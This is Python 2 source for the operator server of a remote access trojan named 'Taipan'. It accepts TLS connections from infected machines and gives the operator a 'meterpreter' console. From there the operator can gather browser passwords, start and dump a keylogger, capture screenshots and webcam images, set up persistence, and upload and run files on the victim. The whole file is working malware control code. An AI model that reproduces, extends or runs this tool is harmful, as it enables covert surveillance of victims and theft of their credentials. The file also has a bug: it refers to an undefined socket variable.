from TaipanInfo import *
from time import sleep
import NotifyIcon
import sys
import thread
import ssl
import socket
import struct
import os

class Client:
    def __init__(self, ClientIpAddress, SocketHandle):
        self.ClientIpAddr = ClientIpAddress
        self.WrappedConnection = SocketHandle
        self.KeyloggerIsOn = False

    def IpAddress(self):
        return self.ClientIpAddr

    def SendFile(self, FileToSend):
        in_file = open(FileToSend, "rb")
        while(True): 
           data = in_file.readline(512)
           if(not data):
              self.sendmessage(WrappedSocket, "finished")
              break
           self.sendmessage(self.WrappedConnection, data)
        in_file.close()

    def ReceiveFile(self, FilePath):
        out_file = open(FilePath, "wb")
        while(True):
            data = self.recvmessage(self.WrappedConnection)
            if(data == "finished"):
                break
            out_file.write(data)
        out_file.close()

    def sendmessage(self, sock, data):
        length = len(data)
        sock.sendall(struct.pack('!I', length))
        sock.sendall(data)

    def recvmessage(self, sock):
        lengthbuf = self.recvall(sock, 4)
        length, = struct.unpack('!I', lengthbuf)
        return self.recvall(sock, length)

    def recvall(self, sock, count):
        buf = b''
        while count:
            newbuf = sock.recv(count)
            if not newbuf: return None
            buf += newbuf
            count -= len(newbuf)
        return buf

    def Meterpreter(self):
        try:
            while True:
                command = raw_input("meterpreter> ")
                if (command == "terminate"): 
                        self.sendmessage(self.WrappedConnection, command)
                        self.WrappedConnection.close()
                        for i in ClientList:
                            if(i.IpAddress() == self.IpAddress()):
                                ClientList.remove(i)
                        break
                elif(command == "screenshot"):
                        self.sendmessage(self.WrappedConnection, command)
                        Result = self.recvmessage(self.WrappedConnection)
                        if(Result == "OK"):
                            self.ReceiveFile("screenshot.png")
                            print("\n[+]Screenshot saved succesfully!\n")
                        else:
                            print("\nSomething went wrong...\n")
                elif(command == "webshot"):
                        self.sendmessage(self.WrappedConnection, command)
                        Result = self.recvmessage(self.WrappedConnection)
                        if(Result == "OK"):
                            self.ReceiveFile("webshot.jpg")
                            print("\n[+]Webshot saved succesfully!\n")
                        else:
                            print("\nNo webcam found!\n")
                elif(command == "sysinfo"):
                        self.sendmessage(self.WrappedConnection, command)
                        OutputResult = self.recvmessage(self.WrappedConnection)
                        print(OutputResult)
                elif(command == "messagebox"):
                        Message = ""
                        Title = ""
                        MessageBoxIcon = ""
                        MessageBoxButtons = ""
                        Message = raw_input("Enter your desired message:")
                        while(Message == ""):
                            Message = raw_input("Error! Message cannot be empty! Enter the message again: ")
                        Title = raw_input("Enter your desired title:")
                        while(Title == ""):
                            Title = raw_input("Error! Title cannot be empty! Enter the title again: ")
                        MessageBoxIcon = raw_input("Enter the desired image(exclamation/info/error): ")
                        while(True):
                            if(MessageBoxIcon == "exclamation" or MessageBoxIcon == "info" or MessageBoxIcon == "error"):
                                break
                            else:
                                MessageBoxIcon = raw_input("Error syntax! Enter the desired image(exclamation/info/error): ")
                        MessageBoxButtons = raw_input("Enter the buttons the MessageBox will have(YesNo/OK/YesNoCancel/OkCancel): ")
                        while(True):
                            if(MessageBoxButtons == "YesNo" or MessageBoxButtons == "OK" or MessageBoxButtons == "YesNoCancel" or MessageBoxButtons == "OkCancel"):
                                break
                            else:
                                MessageBoxButtons = raw_input("Error syntax ! Enter the buttons the MessageBox will have(YesNo/OK/YesNoCancel/OkCancel): ")

                        self.sendmessage(self.WrappedConnection, command)
                        self.sendmessage(self.WrappedConnection, Message)
                        self.sendmessage(self.WrappedConnection, Title)
                        self.sendmessage(self.WrappedConnection, MessageBoxButtons)
                        self.sendmessage(self.WrappedConnection, MessageBoxIcon)
                        print("\n[+]MessageBox Showed!\n")
                elif(command == "persistence"):
                        self.sendmessage(self.WrappedConnection, command)
                        print("\n[+]Persistence Script Executed!\n")
                elif(command == "credgather"):
                        self.sendmessage(self.WrappedConnection, command)

                        ChromeCredentials = self.recvmessage(self.WrappedConnection)
                        print("\nChrome Passwords(if found):\n")
                        print(ChromeCredentials)
                        FirefoxCredentials = self.recvmessage(self.WrappedConnection)
                        print("\nFirefox Passwords(if found):\n")
                        print(FirefoxCredentials)
                elif(command == "uploadexecute"):                        
                        PathToFile = ""
                        while(True):
                            PathToFile = raw_input("Enter the file path: ")
                            if(os.path.isfile(PathToFile)):
                                break
                            else:
                                print("\nInvalid filepath!\n")                        
                        self.sendmessage(self.WrappedConnection, command)
                        self.SendFile(PathToFile)
                elif(command == "keylogger_start"):
                        if(self.KeyloggerIsOn == False):
                            self.sendmessage(self.WrappedConnection, command)
                            print("\n[+]Keylogger started...\n")
                            self.KeyloggerIsOn = True
                        else:
                            print("\nKeylogger is already on...\n")
                elif(command == "keylogger_stop"):
                        if(self.KeyloggerIsOn == True):
                            self.sendmessage(self.WrappedConnection, command)
                            print("\n[+]Keylogger stopped...\n")
                            self.KeyloggerIsOn = False
                        else:
                            print("\nKeylogger is already off...\n")
                elif(command == "keylog_dump"):
                        if(self.KeyloggerIsOn == True):
                            self.sendmessage(self.WrappedConnection, command)
                            Dump = self.recvmessage(self.WrappedConnection)
                            print("\n" + Dump + "\n")
                        else:
                            print("\nYou need to start the keylogger first!\n")
                elif(command == "clear"):
                        os.system('cls' if os.name=='nt' else 'clear')
                elif(command == "help"):
                        PrintMeterpreterHelp()
                elif(command == "exitconn"):
                        break
                else:
                    print("\nCommand not found!\n")
        except:
            print("\nConnection with client terminated unexpected!!\n")
            self.WrappedConnection.close()
            for i in ClientList:
                if(i.IpAddress() == self.IpAddress()):
                    ClientList.remove(i)


ClientList = []  # Here we save the clients

def IsInteger(VariableToCheck):
    try:
        int(VariableToCheck)
        return True
    except:
        return False


def Handler():
    while(True):
        print("")
        command = raw_input("Handler> ")
        if(command == "printconns"):
            if(len(ClientList) > 0):
                counter = 1
                for client in ClientList:
                    print("ID: " + str(counter) + " IP: " + client.IpAddress())
                    counter += 1
            else:
                print("\nNo clients connected!\n")
        elif(command == "conn"):
            connection = ""
            while(True):
                connection = raw_input("\nGive the ID of the connection: ")
                print("")
                if(connection != ""):
                    if(IsInteger(connection)):
                        if(int(connection) <= len(ClientList)):
                            break          
            ClientList[int(connection) -1].Meterpreter()
        elif(command == "exit"):
            print("Exiting...")
            sys.exit()
        elif(command == "clear"):
            os.system('cls' if os.name=='nt' else 'clear')
        elif(command == "help"):
            PrintHandleHelp()
        else:
            print("\nCommand not found!\n")

def Listener():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("192.168.1.150", 1605))                          
    s.listen(1)
    conn, addr = s.accept()
    WrappedConnection = ssl.wrap_socket(conn, server_side=True,certfile="certification.cert", keyfile="privatekey.key", ssl_version=ssl.PROTOCOL_TLSv1)
    NewClient = Client(str(addr), WrappedConnection)
    ClientList.append(NewClient)
    NotifyIcon.balloon_tip("New Client Connected", "New client connected with IP: " + str(addr), "balloontip.ico")
    thread.start_new_thread(Listener, ())

def main ():
    os.system("title Taipan Remote Administration Tool")
    PrintTaipanFooter()
    print ("[+] Listening for incoming TCP connection")
    print("[+] Waiting for client...\n")
    thread.start_new_thread(Listener, ())
    while(len(ClientList) == 0):
        sleep(1)
    Handler()
main()